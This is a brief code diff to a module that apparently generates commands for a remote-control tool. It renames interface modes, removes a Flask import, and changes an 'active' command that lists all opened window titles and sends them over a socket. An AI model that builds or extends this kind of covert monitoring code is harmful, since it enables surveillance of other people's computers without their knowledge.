@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -32,7 +31,7 @@ def active():
     encoded = list(set(encoded))
     data = '[+]All opened windows : \\n'
     data += ''.join(encoded)
-    main_send(data + "\\n", s)''')
+    send_all(s,data + '\\n')''')
         config.logics.append('''
             elif command == "active":
                 active()''')
